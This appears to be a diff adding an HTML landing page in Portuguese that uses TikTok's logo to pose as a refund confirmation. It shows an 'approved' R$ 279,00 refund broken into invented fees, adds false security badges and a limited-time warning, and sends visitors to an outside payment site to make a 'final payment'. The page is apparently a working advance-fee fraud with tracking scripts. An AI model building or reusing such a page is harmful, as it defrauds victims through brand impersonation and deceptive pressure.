@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script
+			src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+			data-token="b37547bb-ec0c-41df-a0ba-890b47c59feb"
+	>
+	</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="max-image-preview:large">
+    <title>Confirmação de Processamento - Sistema de Reembolso</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;600;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+     <!-- TikTok Pixel Code Start -->
+    <script>
+      !(function (w, d, t) {
+        w.TiktokAnalyticsObject = t;
+        var ttq = (w[t] = w[t] || []);
+        ttq.methods = [
+          "page",
+          "track",
+          "identify",
+          "instances",
+          "debug",
+          "on",
+          "off",
+          "once",
+          "ready",
+          "alias",
+          "group",
+          "enableCookie",
+          "disableCookie",
+          "holdConsent",
+          "revokeConsent",
+          "grantConsent",
+        ];
+        ttq.setAndDefer = function (t, e) {
+          t[e] = function () {
+            t.push([e].concat(Array.prototype.slice.call(arguments, 0)));
+          };
+        };
+        for (var i = 0; i < ttq.methods.length; i++) {
+          ttq.setAndDefer(ttq, ttq.methods[i]);
+        }
+        ttq.instance = function (t) {
+          for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) {
+            ttq.setAndDefer(e, ttq.methods[n]);
+          }
+          return e;
+        };
+        ttq.load = function (e, n) {
+          var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
+            o = n && n.partner;
+          ttq._i = ttq._i || {};
+          ttq._i[e] = [];
+          ttq._i[e]._u = r;
+          ttq._t = ttq._t || {};
+          ttq._t[e] = +new Date();
+          ttq._o = ttq._o || {};
+          ttq._o[e] = n || {};
+          var a = document.createElement("script");
+          a.type = "text/javascript";
+          a.async = true;
+          a.src = r + "?sdkid=" + e + "&lib=" + t;
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(a, s);
+        };
+        ttq.load("D49KFG3C77UCC42376O0");
+        ttq.page();
+      })(window, document, "ttq");
+    </script>
+    <!-- TikTok Pixel Code End -->
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: 'Inter', 'Poppins', sans-serif;
+        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+        color: #333;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+        line-height: 1.6;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 680px;
+        background: #ffffff;
+        border-radius: 16px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+        overflow: hidden;
+      }
+
+      .header {
+        background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+        padding: 25px 30px;
+        border-bottom: 1px solid #e9ecef;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 15px;
+      }
+
+      .logo {
+        display: flex;
+        align-items: center;
+      }
+
+      .protocol-section {
+        text-align: right;
+      }
+
+      .protocol-label {
+        font-size: 0.75rem;
+        color: #6c757d;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        font-weight: 600;
+        margin-bottom: 4px;
+      }
+
+      .protocol-number {
+        font-size: 1rem;
+        color: #212529;
+        font-weight: 700;
+        font-family: 'Courier New', monospace;
+        letter-spacing: 1px;
+      }
+
+      .timestamp {
+        font-size: 0.8rem;
+        color: #6c757d;
+        margin-top: 4px;
+      }
+
+      .main-content {
+        padding: 40px 30px;
+        text-align: center;
+      }
+
+      .status-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        background: #d4edda;
+        color: #155724;
+        padding: 8px 16px;
+        border-radius: 20px;
+        font-size: 0.85rem;
+        font-weight: 600;
+        margin-bottom: 25px;
+        border: 1px solid #c3e6cb;
+      }
+
+      .status-badge i {
+        font-size: 0.9rem;
+      }
+
+      .success-icon {
+        width: 90px;
+        height: 90px;
+        background: linear-gradient(135deg, #04c500, #00a000);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 25px;
+        animation: scaleIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        box-shadow: 0 10px 30px rgba(4, 197, 0, 0.25);
+        position: relative;
+      }
+
+      .success-icon::after {
+        content: '';
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        border-radius: 50%;
+        border: 3px solid rgba(4, 197, 0, 0.2);
+        animation: ripple 2s infinite;
+      }
+
+      .success-icon i {
+        font-size: 45px;
+        color: #ffffff;
+        z-index: 1;
+      }
+
+      @keyframes scaleIn {
+        0% {
+          transform: scale(0) rotate(-180deg);
+          opacity: 0;
+        }
+        100% {
+          transform: scale(1) rotate(0deg);
+          opacity: 1;
+        }
+      }
+
+      @keyframes ripple {
+        0% {
+          transform: scale(1);
+          opacity: 1;
+        }
+        100% {
+          transform: scale(1.3);
+          opacity: 0;
+        }
+      }
+
+      .success-title {
+        font-size: 2rem;
+        font-weight: 700;
+        color: #212529;
+        margin-bottom: 12px;
+        line-height: 1.3;
+      }
+
+      .success-message {
+        font-size: 1.05rem;
+        color: #495057;
+        margin-bottom: 35px;
+        line-height: 1.6;
+        font-weight: 400;
+      }
+
+      .refund-section {
+        background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+        border-radius: 12px;
+        padding: 30px;
+        margin-bottom: 25px;
+        border: 2px solid #04c500;
+        box-shadow: 0 4px 20px rgba(4, 197, 0, 0.08);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .refund-section::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 4px;
+        background: linear-gradient(90deg, #04c500, #00a000);
+      }
+
+      .refund-header {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        margin-bottom: 20px;
+      }
+
+      .refund-title {
+        font-size: 1.25rem;
+        font-weight: 700;
+        color: #212529;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .refund-title i {
+        font-size: 1.4rem;
+        color: #04c500;
+      }
+
+      .refund-amount-container {
+        margin-bottom: 25px;
+      }
+
+      .refund-amount-label {
+        font-size: 0.9rem;
+        color: #6c757d;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        font-weight: 600;
+        margin-bottom: 8px;
+      }
+
+      .refund-amount {
+        font-size: 3.2rem;
+        font-weight: 700;
+        color: #04c500;
+        margin-bottom: 8px;
+        text-shadow: 0 2px 8px rgba(4, 197, 0, 0.15);
+        font-family: 'Inter', sans-serif;
+      }
+
+      .refund-subtitle {
+        font-size: 0.95rem;
+        color: #6c757d;
+        font-weight: 500;
+      }
+
+      .refund-details {
+        background: #ffffff;
+        border-radius: 10px;
+        padding: 24px;
+        margin-top: 24px;
+        text-align: left;
+        border: 1px solid #e9ecef;
+      }
+
+      .refund-details-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding-bottom: 12px;
+        margin-bottom: 12px;
+        border-bottom: 2px solid #e9ecef;
+      }
+
+      .refund-details-title {
+        font-size: 0.9rem;
+        color: #6c757d;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        font-weight: 600;
+      }
+
+      .refund-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 14px 0;
+        border-bottom: 1px solid #f1f3f5;
+        transition: background 0.2s;
+        gap: 12px;
+      }
+
+      .refund-item:hover {
+        background: #f8f9fa;
+        margin: 0 -12px;
+        padding-left: 12px;
+        padding-right: 12px;
+        border-radius: 6px;
+      }
+
+      .refund-item:last-of-type {
+        border-bottom: none;
+        font-weight: 700;
+        font-size: 1.15rem;
+        color: #04c500;
+        margin-top: 12px;
+        padding-top: 18px;
+        border-top: 2px solid #04c500;
+        background: linear-gradient(135deg, #f0fff4 0%, #ffffff 100%);
+        margin-left: -12px;
+        margin-right: -12px;
+        padding-left: 12px;
+        padding-right: 12px;
+        border-radius: 0 0 8px 8px;
+      }
+
+      .refund-item-label {
+        color: #495057;
+        font-size: 0.75rem;
+        font-weight: 500;
+        flex: 1;
+        min-width: 0;
+        line-height: 1.2;
+      }
+
+      .refund-item-value {
+        color: #212529;
+        font-weight: 600;
+        font-size: 0.9rem;
+        font-family: 'Inter', sans-serif;
+        white-space: nowrap;
+        flex-shrink: 0;
+        margin-left: 12px;
+      }
+
+      .refund-item:last-of-type .refund-item-label {
+        color: #212529;
+        font-size: 0.95rem;
+      }
+
+      .refund-item:last-of-type .refund-item-value {
+        color: #04c500;
+        font-size: 1.2rem;
+        white-space: nowrap;
+      }
+
+      .guarantee-badges {
+        display: flex;
+        justify-content: center;
+        gap: 6px;
+        flex-wrap: nowrap;
+        margin-bottom: 25px;
+      }
+
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 4px;
+        background: #f8f9fa;
+        color: #495057;
+        padding: 5px 10px;
+        border-radius: 20px;
+        font-size: 0.7rem;
+        font-weight: 500;
+        border: 1px solid #e9ecef;
+        white-space: nowrap;
+        flex-shrink: 0;
+      }
+
+      .badge i {
+        color: #04c500;
+        font-size: 0.9rem;
+      }
+
+      .info-box {
+        background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+        border-left: 4px solid #fe2c55;
+        border-radius: 8px;
+        padding: 18px;
+        margin-bottom: 25px;
+        text-align: left;
+        box-shadow: 0 2px 8px rgba(254, 44, 85, 0.1);
+      }
+
+      .info-box-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 8px;
+      }
+
+      .info-box-header i {
+        color: #fe2c55;
+        font-size: 1.1rem;
+      }
+
+      .info-box-header strong {
+        color: #856404;
+        font-size: 0.95rem;
+      }
+
+      .info-box p {
+        font-size: 0.9rem;
+        color: #856404;
+        margin: 0;
+        line-height: 1.6;
+      }
+
+      .processing-info {
+        background: #f8f9fa;
+        border-radius: 8px;
+        padding: 20px;
+        margin-bottom: 25px;
+        text-align: left;
+      }
+
+      .processing-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px 0;
+        border-bottom: 1px solid #e9ecef;
+        gap: 12px;
+      }
+
+      .processing-item:last-child {
+        border-bottom: none;
+      }
+
+      .processing-label {
+        font-size: 0.85rem;
+        color: #6c757d;
+        font-weight: 500;
+        flex: 1;
+        min-width: 0;
+      }
+
+      .processing-value {
+        font-size: 0.85rem;
+        color: #212529;
+        font-weight: 600;
+        white-space: nowrap;
+        flex-shrink: 0;
+        margin-left: 12px;
+      }
+
+      .cta-button {
+        background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+        color: #fff;
+        border: none;
+        padding: 18px 40px;
+        font-size: 1.05rem;
+        font-weight: 700;
+        border-radius: 12px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        width: 100%;
+        max-width: 450px;
+        letter-spacing: 0.3px;
+        text-transform: uppercase;
+        font-size: 0.95rem;
+      }
+
+      .cta-button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 32px rgba(0, 0, 0, 0.4);
+        background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
+      }
+
+      .cta-button:active {
+        transform: translateY(0);
+      }
+
+      .urgency-text {
+        font-size: 0.9rem;
+        color: #fe2c55;
+        font-weight: 600;
+        margin-top: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+      }
+
+      .footer-security {
+        background: #f8f9fa;
+        padding: 20px 30px;
+        border-top: 1px solid #e9ecef;
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+        flex-wrap: wrap;
+      }
+
+      .security-item {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 0.75rem;
+        color: #6c757d;
+      }
+
+      .security-item i {
+        color: #04c500;
+        font-size: 0.85rem;
+      }
+
+      @media (max-width: 600px) {
+        .container {
+          border-radius: 12px;
+        }
+
+        .header {
+          padding: 20px;
+          flex-direction: column;
+          align-items: flex-start;
+        }
+
+        .protocol-section {
+          text-align: left;
+          width: 100%;
+        }
+
+        .main-content {
+          padding: 30px 20px;
+        }
+
+        .success-title {
+          font-size: 1.7rem;
+        }
+
+        .refund-amount {
+          font-size: 2.5rem;
+        }
+
+        .success-icon {
+          width: 75px;
+          height: 75px;
+        }
+
+        .success-icon i {
+          font-size: 38px;
+        }
+
+        .refund-section {
+          padding: 20px;
+        }
+
+        .refund-details {
+          padding: 18px;
+        }
+
+        .guarantee-badges {
+          gap: 4px;
+          flex-wrap: nowrap;
+        }
+
+        .badge {
+          font-size: 0.65rem;
+          padding: 4px 8px;
+          gap: 3px;
+        }
+
+        .refund-item-label {
+          font-size: 0.7rem;
+        }
+
+        .refund-item-value {
+          font-size: 0.85rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <div class="logo">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 42" width="118" height="42">
+            <path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
+            <path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path>
+            <path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path>
+            <path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path>
+            <path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path>
+            <path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path>
+            <path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
+            <path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
+          </svg>
+        </div>
+        <div class="protocol-section">
+          <div class="protocol-label">Protocolo</div>
+          <div class="protocol-number" id="protocolNumber">REF-2024-</div>
+          <div class="timestamp" id="timestamp"></div>
+        </div>
+      </div>
+
+      <div class="main-content">
+        <div class="status-badge">
+          <i class="fas fa-check-circle"></i>
+          <span>Processamento Confirmado</span>
+        </div>
+
+        <div class="success-icon">
+          <i class="fas fa-check"></i>
+        </div>
+
+        <h1 class="success-title">Parabéns!</h1>
+        <p class="success-message">Sua solicitação foi concluída com sucesso e está sendo processada pelo nosso sistema.</p>
+
+        <div class="guarantee-badges">
+          <div class="badge">
+            <i class="fas fa-shield-alt"></i>
+            <span>100% Seguro</span>
+          </div>
+          <div class="badge">
+            <i class="fas fa-lock"></i>
+            <span>SSL</span>
+          </div>
+          <div class="badge">
+            <i class="fas fa-certificate"></i>
+            <span>Garantido</span>
+          </div>
+        </div>
+
+        <div class="refund-section">
+          <div class="refund-header">
+            <div class="refund-title">
+              <i class="fas fa-money-bill-wave"></i>
+              <span>Devolução de Valores Autorizada</span>
+            </div>
+          </div>
+          <div class="refund-amount-container">
+            <div class="refund-amount-label">Valor Total a Devolver</div>
+            <div class="refund-amount">R$ 279,00</div>
+            <div class="refund-subtitle">Será creditado em até 7 dias úteis</div>
+          </div>
+
+          <div class="refund-details">
+            <div class="refund-details-header">
+              <div class="refund-details-title">Detalhamento das Taxas</div>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Confirmação de Identidade</span>
+              <span class="refund-item-value">R$ 19,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Processamento de Dados</span>
+              <span class="refund-item-value">R$ 27,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Segurança e Verificação</span>
+              <span class="refund-item-value">R$ 24,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Validação de Documentos</span>
+              <span class="refund-item-value">R$ 29,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Ativação de Conta</span>
+              <span class="refund-item-value">R$ 27,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Manutenção do Sistema</span>
+              <span class="refund-item-value">R$ 24,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Suporte Técnico</span>
+              <span class="refund-item-value">R$ 19,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Liberação de Acesso</span>
+              <span class="refund-item-value">R$ 27,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Finalização de Processo</span>
+              <span class="refund-item-value">R$ 24,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">Taxa de Conclusão de Cadastro</span>
+              <span class="refund-item-value">R$ 31,90</span>
+            </div>
+            <div class="refund-item">
+              <span class="refund-item-label">TOTAL A SER DEVOLVIDO</span>
+              <span class="refund-item-value">R$ 279,00</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="processing-info">
+          <div class="processing-item">
+            <span class="processing-label">Status do Processamento:</span>
+            <span class="processing-value" style="color: #04c500; font-weight: 700;">Aprovado</span>
+          </div>
+          <div class="processing-item">
+            <span class="processing-label">Prazo para Devolução:</span>
+            <span class="processing-value">Até 7 dias úteis</span>
+          </div>
+          <div class="processing-item">
+            <span class="processing-label">Forma de Crédito:</span>
+            <span class="processing-value">Conta Bancária Cadastrada</span>
+          </div>
+        </div>
+
+        <div class="info-box">
+          <div class="info-box-header">
+            <i class="fas fa-info-circle"></i>
+            <strong>Informação Importante</strong>
+          </div>
+          <p>
+            Todos os valores pagos em taxas serão devolvidos integralmente em sua conta bancária cadastrada em até 7 dias úteis após a confirmação do pagamento final. O processo está sendo monitorado e você receberá uma notificação assim que o crédito for realizado.
+          </p>
+        </div>
+
+        <button onclick="redirectToPayment()" class="cta-button">
+          <i class="fas fa-arrow-right"></i>
+          <span>Finalizar Processo de Reembolso</span>
+        </button>
+
+        <p class="urgency-text">
+          <i class="fas fa-clock"></i>
+          <span>Oferta válida por tempo limitado</span>
+        </p>
+      </div>
+
+      <div class="footer-security">
+        <div class="security-item">
+          <i class="fas fa-shield-alt"></i>
+          <span>Transação Segura</span>
+        </div>
+        <div class="security-item">
+          <i class="fas fa-lock"></i>
+          <span>Dados Protegidos</span>
+        </div>
+        <div class="security-item">
+          <i class="fas fa-user-shield"></i>
+          <span>LGPD Compliant</span>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Gera número de protocolo único
+      function generateProtocolNumber() {
+        const timestamp = Date.now();
+        const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+        return 'REF-2024-' + timestamp.toString().slice(-8) + random;
+      }
+
+      // Formata data e hora
+      function formatTimestamp() {
+        const now = new Date();
+        const day = String(now.getDate()).padStart(2, '0');
+        const month = String(now.getMonth() + 1).padStart(2, '0');
+        const year = now.getFullYear();
+        const hours = String(now.getHours()).padStart(2, '0');
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        return `${day}/${month}/${year} às ${hours}:${minutes}`;
+      }
+
+      // Atualiza protocolo e timestamp
+      document.getElementById('protocolNumber').textContent = generateProtocolNumber();
+      document.getElementById('timestamp').textContent = formatTimestamp();
+
+      function redirectToPayment() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const queryString = urlParams.toString();
+        window.location.href = "https://pay.finalizaquestbr.site/693957db46dbb29c1f4c1f19" + (queryString ? "?" + queryString : "");
+      }
+    </script>
+</body>
+</html>
